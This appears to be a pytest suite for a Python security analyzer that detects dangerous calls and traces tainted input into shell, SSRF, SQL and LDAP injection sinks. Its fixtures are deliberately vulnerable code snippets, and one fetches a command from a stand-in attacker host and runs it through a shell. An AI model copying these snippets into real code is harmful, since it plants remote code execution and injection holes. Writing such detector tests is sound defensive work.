import os, sys, textwrap

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))
from python_analyzer import analyze_python


def _write(tmp_path, name, body):
    p = tmp_path / name
    p.write_text(textwrap.dedent(body))
    return str(p)


def _categories(findings):
    return {(f["category"], f["detected_by"]) for f in findings}


def _descriptions(findings):
    return [f["description"] for f in findings]


# --- AST risk detection ---

def test_eval_call_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "eval('1+1')\n")
    r = analyze_python(p)
    assert any(f["detected_by"] == "AST" and "eval" in f["description"].lower()
               for f in r["findings"])


def test_exec_call_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "exec('print(1)')\n")
    r = analyze_python(p)
    assert any("exec" in f["description"].lower() for f in r["findings"])


def test_pickle_loads_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import pickle
        pickle.loads(b'')
    """)
    r = analyze_python(p)
    assert any("pickle" in f["description"].lower() for f in r["findings"])


def test_yaml_load_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import yaml
        yaml.load('foo')
    """)
    r = analyze_python(p)
    assert any("yaml" in f["description"].lower() for f in r["findings"])


def test_os_system_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "import os\nos.system('ls')\n")
    r = analyze_python(p)
    assert any("os.system" in f["description"] for f in r["findings"])


def test_subprocess_shell_true_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import subprocess
        subprocess.run('echo hi', shell=True)
    """)
    r = analyze_python(p)
    assert any("shell=True" in f["description"] for f in r["findings"])


def test_subprocess_shell_false_not_flagged(tmp_path):
    p = _write(tmp_path, "a.py", """
        import subprocess
        subprocess.run(['echo', 'hi'])
    """)
    r = analyze_python(p)
    assert not any("shell=True" in f["description"] for f in r["findings"])


def test_dynamic_getattr_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "getattr(obj, 'ev' + 'al')(x)\n")
    r = analyze_python(p)
    assert any("Dynamic attribute access" in f["description"] for f in r["findings"])


def test_dynamic_import_flagged(tmp_path):
    p = _write(tmp_path, "a.py", "__import__('os').system('ls')\n")
    r = analyze_python(p)
    assert any("__import__" in f["description"] for f in r["findings"])


# --- Taint tracking ---

def test_taint_envvar_to_eval(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['CMD']
            eval(x)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "eval" in f["description"]
               for f in r["findings"])


def test_taint_input_to_exec(tmp_path):
    p = _write(tmp_path, "a.py", """
        def go():
            cmd = input('? ')
            exec(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "exec" in f["description"]
               for f in r["findings"])


def test_taint_sys_argv_to_os_system(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os, sys
        def go():
            cmd = sys.argv[1]
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "shell injection" in f["description"]
               for f in r["findings"])


def test_taint_requests_to_subprocess(tmp_path):
    p = _write(tmp_path, "a.py", """
        import requests, subprocess
        def go():
            resp = requests.get('https://attacker.example/cmd').text
            subprocess.run(resp, shell=True)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "subprocess.run" in f["description"]
               for f in r["findings"])


def test_taint_fstring_propagates(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['Y']
            cmd = f"echo {x}"
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" for f in r["findings"])


def test_taint_concat_propagates(tmp_path):
    p = _write(tmp_path, "a.py", """
        import os
        def go():
            x = os.environ['Y']
            cmd = 'echo ' + x
            os.system(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" for f in r["findings"])


def test_taint_mcp_handler_args_marked(tmp_path):
    p = _write(tmp_path, "a.py", """
        from mcp.server import Server
        server = Server('x')

        @server.call_tool()
        async def handle(name, arguments):
            cmd = arguments['cmd']
            eval(cmd)
    """)
    r = analyze_python(p)
    assert any(f["detected_by"] == "TAINT" and "eval" in f["description"]
               for f in r["findings"])


def test_non_mcp_function_params_not_tainted(tmp_path):
    # Plain function — param is not auto-tainted, so this should NOT raise a TAINT finding
    p = _write(tmp_path, "a.py", """
        def helper(x):
            eval(x)
    """)
    r = analyze_python(p)
    taint = [f for f in r["findings"] if f["detected_by"] == "TAINT"]
    assert taint == []


def test_constant_arg_to_eval_no_taint_finding(tmp_path):
    p = _write(tmp_path, "a.py", "eval('1+1')\n")
    r = analyze_python(p)
    taint = [f for f in r["findings"] if f["detected_by"] == "TAINT"]
    assert taint == []
    # The AST risk visitor still flags the eval call itself
    assert any(f["detected_by"] == "AST" for f in r["findings"])


# --- Robustness ---

def test_safe_code_clean(tmp_path):
    p = _write(tmp_path, "a.py", """
        def add(a, b):
            return a + b
    """)
    r = analyze_python(p)
    assert r["findings"] == []
    assert r["files_analyzed"] == 1


def test_syntax_error_skipped(tmp_path):
    p = _write(tmp_path, "a.py", "def broken(:\n")
    r = analyze_python(p)
    assert r["findings"] == []
    assert any("syntax error" in s["reason"] for s in r["skipped"])


def test_non_python_file_reports_skipped(tmp_path):
    p = tmp_path / "data.txt"
    p.write_text("not python")
    r = analyze_python(str(p))
    assert r["findings"] == []
    assert any("not a .py" in s["reason"] for s in r["skipped"])


def test_missing_path_returns_error(tmp_path):
    r = analyze_python(str(tmp_path / "does_not_exist"))
    assert "error" in r


def test_directory_walks_all_py(tmp_path):
    (tmp_path / "a.py").write_text("eval('x')\n")
    sub = tmp_path / "pkg"
    sub.mkdir()
    (sub / "b.py").write_text("exec('y')\n")
    (sub / "ignored.txt").write_text("nope")
    r = analyze_python(str(tmp_path))
    assert r["files_analyzed"] == 2
    assert len(r["findings"]) >= 2


def test_directory_skips_venv_and_pycache(tmp_path):
    pycache = tmp_path / "__pycache__"
    pycache.mkdir()
    (pycache / "a.py").write_text("eval('x')\n")
    venv = tmp_path / ".venv"
    venv.mkdir()
    (venv / "b.py").write_text("exec('y')\n")
    (tmp_path / "real.py").write_text("def x(): return 1\n")
    r = analyze_python(str(tmp_path))
    assert r["files_analyzed"] == 1
    assert r["findings"] == []


def test_oversized_file_skipped(tmp_path, monkeypatch):
    monkeypatch.setattr("python_analyzer._FILE_SIZE_LIMIT", 50)
    p = tmp_path / "big.py"
    p.write_text("def x():\n    return 1\n" * 200)
    r = analyze_python(str(p))
    assert r["files_analyzed"] == 0
    assert any("exceeds" in s["reason"] for s in r["skipped"])


# --- Taint analyzer regression tests for code-review fixes ---

def _taint_findings(tmp_path, src):
    p = _write(tmp_path, "a.py", src)
    r = analyze_python(p)
    return [f for f in r["findings"] if f["detected_by"] == "TAINT"]


def test_taint_does_not_leak_into_nested_function(tmp_path):
    # Outer taints x via os.environ, but inner function's `x` is a fresh parameter.
    # Outer's visitor must NOT descend into inner's body.
    findings = _taint_findings(tmp_path, """
        import os
        def outer():
            x = os.environ['BAD']
            def inner(x):
                eval(x)
            return inner
    """)
    assert findings == [], f"taint leaked into nested function: {findings}"


def test_taint_cleared_on_safe_reassignment(tmp_path):
    # x = input() taints x; then x = 'safe' must clear that taint.
    findings = _taint_findings(tmp_path, """
        def f():
            x = input()
            x = 'hardcoded literal'
            eval(x)
    """)
    assert findings == [], f"taint not cleared on safe reassign: {findings}"


def test_taint_not_propagated_through_int_wrapper(tmp_path):
    # int(tainted) yields an int — cannot carry injection payload.
    findings = _taint_findings(tmp_path, """
        def f():
            n = int(input())
            eval(str(n))
    """)
    assert findings == [], f"int() wrapper propagated taint: {findings}"


def test_taint_not_propagated_through_len_wrapper(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f():
            n = len(input())
            eval(str(n))
    """)
    assert findings == []


def test_taint_propagates_through_annotated_assignment(tmp_path):
    # cmd: str = arguments['cmd'] is AnnAssign, not Assign — must still taint cmd.
    findings = _taint_findings(tmp_path, """
        from mcp.server import Server
        s = Server('x')
        @s.call_tool()
        async def h(name, arguments):
            cmd: str = arguments['cmd']
            eval(cmd)
    """)
    assert any("eval" in f["description"] for f in findings), \
        f"AnnAssign taint missed: {findings}"


def test_taint_propagates_through_augassign(tmp_path):
    findings = _taint_findings(tmp_path, """
        import os
        def f():
            cmd = 'echo '
            cmd += os.environ['X']
            os.system(cmd)
    """)
    assert any("os.system" in f["description"] for f in findings), \
        f"AugAssign taint missed: {findings}"


def test_taint_still_catches_real_envvar_to_eval(tmp_path):
    # Regression-of-regression: the genuine pattern must still fire.
    findings = _taint_findings(tmp_path, """
        import os
        def f():
            x = os.environ['CMD']
            eval(x)
    """)
    assert any("eval" in f["description"] for f in findings)


# --- SSRF detection ---

def test_taint_ssrf_requests_get(tmp_path):
    findings = _taint_findings(tmp_path, """
        import requests
        def f():
            url = input('URL: ')
            requests.get(url)
    """)
    assert any("SSRF" in f["description"] and "requests.get" in f["description"]
               for f in findings)


def test_taint_ssrf_requests_post(tmp_path):
    findings = _taint_findings(tmp_path, """
        import requests
        def f():
            url = input('URL: ')
            requests.post(url, data='x')
    """)
    assert any("SSRF" in f["description"] and "requests.post" in f["description"]
               for f in findings)


def test_taint_ssrf_urlopen(tmp_path):
    findings = _taint_findings(tmp_path, """
        from urllib import request
        def f():
            url = input('URL: ')
            request.urlopen(url)
    """)
    assert any("SSRF" in f["description"] and "urlopen" in f["description"]
               for f in findings)


def test_taint_ssrf_envvar_to_requests(tmp_path):
    findings = _taint_findings(tmp_path, """
        import os, requests
        def f():
            url = os.environ['TARGET']
            requests.get(url)
    """)
    assert any("SSRF" in f["description"] for f in findings)


def test_ssrf_safe_hardcoded_url_not_flagged(tmp_path):
    findings = _taint_findings(tmp_path, """
        import requests
        def f():
            requests.get('https://example.com/api')
    """)
    assert not any("SSRF" in f["description"] for f in findings)


def test_ssrf_safe_url_after_reassignment(tmp_path):
    findings = _taint_findings(tmp_path, """
        import requests
        def f():
            url = input('URL: ')
            url = 'https://safe.example.com'
            requests.get(url)
    """)
    assert not any("SSRF" in f["description"] for f in findings)


# --- SQL injection detection ---

def test_taint_sql_fstring(tmp_path):
    findings = _taint_findings(tmp_path, """
        import sqlite3
        def f():
            name = input('name: ')
            conn = sqlite3.connect(':memory:')
            conn.execute(f"SELECT * FROM users WHERE name = '{name}'")
    """)
    assert any("SQL injection" in f["description"] for f in findings)


def test_taint_sql_format_method(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            name = input('name: ')
            query = "SELECT * FROM users WHERE name = '{}'".format(name)
            cursor.execute(query)
    """)
    assert any("SQL injection" in f["description"] for f in findings)


def test_taint_sql_percent_format(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            name = input('name: ')
            query = "SELECT * FROM users WHERE name = '%s'" % name
            cursor.execute(query)
    """)
    assert any("SQL injection" in f["description"] for f in findings)


def test_taint_sql_concat(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            name = input('name: ')
            query = "SELECT * FROM users WHERE name = '" + name + "'"
            cursor.execute(query)
    """)
    assert any("SQL injection" in f["description"] for f in findings)


def test_sql_parameterized_query_not_flagged(tmp_path):
    """Parameterized queries are safe — should NOT be flagged."""
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            name = input('name: ')
            cursor.execute("SELECT * FROM users WHERE name = ?", (name,))
    """)
    assert not any("SQL injection" in f["description"] for f in findings)


def test_sql_hardcoded_query_not_flagged(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            cursor.execute("SELECT * FROM users")
    """)
    assert not any("SQL injection" in f["description"] for f in findings)


def test_sql_executemany_fstring(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(cursor):
            table = input('table: ')
            cursor.executemany(f"INSERT INTO {table} VALUES (?)", rows)
    """)
    assert any("SQL injection" in f["description"] for f in findings)


# --- LDAP injection detection ---

def test_taint_ldap_search_s(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(ldap):
            uid = input('uid: ')
            filt = f"(uid={uid})"
            ldap.search_s("dc=example,dc=com", 2, filt)
    """)
    assert any("LDAP injection" in f["description"] for f in findings)


def test_taint_ldap_search(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(ldap):
            uid = input('uid: ')
            ldap.search("dc=example,dc=com", 2, f"(uid={uid})")
    """)
    assert any("LDAP injection" in f["description"] for f in findings)


def test_taint_ldap_search_keyword_filterstr(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(ldap):
            uid = input('uid: ')
            ldap.search_s("dc=example,dc=com", 2, filterstr=f"(uid={uid})")
    """)
    assert any("LDAP injection" in f["description"] for f in findings)


def test_ldap_safe_hardcoded_filter_not_flagged(tmp_path):
    findings = _taint_findings(tmp_path, """
        def f(ldap):
            ldap.search_s("dc=example,dc=com", 2, "(uid=admin)")
    """)
    assert not any("LDAP injection" in f["description"] for f in findings)


def test_ldap_safe_no_filter_arg_not_flagged(tmp_path):
    """search_s with only base and scope (no filter) — no crash, no finding."""
    findings = _taint_findings(tmp_path, """
        def f(ldap):
            ldap.search_s("dc=example,dc=com", 2)
    """)
    assert not any("LDAP injection" in f["description"] for f in findings)
